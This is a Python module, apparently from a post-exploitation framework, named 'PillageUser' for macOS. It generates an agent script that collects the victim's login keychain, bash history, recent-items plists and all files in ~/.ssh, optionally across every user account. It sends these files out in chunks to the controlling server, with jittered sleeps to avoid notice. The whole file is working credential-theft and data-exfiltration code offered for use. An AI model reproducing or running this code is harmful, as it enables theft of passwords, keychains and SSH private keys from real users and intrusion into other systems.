class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'PillageUser',
            'Author': ['@harmj0y'],
            'Description': ("Pillages the current user for their keychain, bash_history, ssh known hosts, "
                            "recent folders, etc. For logon.keychain, use https://github.com/n0fate/chainbreaker ."
                            "For other .plist files, check https://davidkoepi.wordpress.com/2013/07/06/macforensics5/"),
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                "https://davidkoepi.wordpress.com/2013/07/06/macforensics5/"
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Sleep' : {
                'Description'   :   "Switch. Sleep the agent's normal interval between downloads, otherwise use one blast.",
                'Required'      :   False,
                'Value'         :   'True'
            },
            'AllUsers' : {
                'Description'   :   "Switch. Run for all users (needs root privileges!)",
                'Required'      :   False,
                'Value'         :   'False'
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        sleep = self.options['Sleep']['Value']
        allUsers = self.options['AllUsers']['Value']
        script = """
import os
def downloadFile(path):
    import os
    filePath = os.path.expanduser(path)
    if os.path.isfile(filePath):
        offset = 0
        size = os.path.getsize(filePath)
        while True:
            partIndex = 0
            encodedPart = get_file_part(filePath, offset)
            partData = "%%s|%%s|%%s" %%(partIndex, filePath, encodedPart)
            if not encodedPart or encodedPart == '': break
            sendMessage(encodePacket(41, partData))
            if "%(sleep)s".lower() == "true":
                global minSleep
                global maxSleep
                minSleep = (1.0-jitter)*delay
                maxSleep = (1.0+jitter)*delay
                sleepTime = random.randint(minSleep, maxSleep)
                time.sleep(sleepTime)
            partIndex += 1
            offset += 5120000
searchPaths = ['/Library/Keychains/login.keychain', '/.bash_history', '/Library/Preferences/com.apple.finder.plist', '/Library/Preferences/com.apple.recentitems.plist', '/Library/Preferences/com.apple.Preview.plist' ]
if "%(allUsers)s".lower() == "true":
    d='/Users/'
    userPaths = [os.path.join(d,o) for o in os.listdir(d) if os.path.isdir(os.path.join(d,o))]
else:
    userPaths = ['~/']
for userPath in userPaths:
    for searchPath in searchPaths:
        downloadFile(userPath + searchPath)
filePath = os.path.expanduser('~/.ssh/')
sshFiles = [f for f in os.listdir(filePath) if os.path.isfile(os.path.join(filePath, f))]
for sshFile in sshFiles:
    downloadFile('~/.ssh/' + sshFile)
print "pillaging complete, if login.keychain recovered, use chainbreaker with the user password"
""" % {'sleep': sleep, 'allUsers': allUsers}
        return script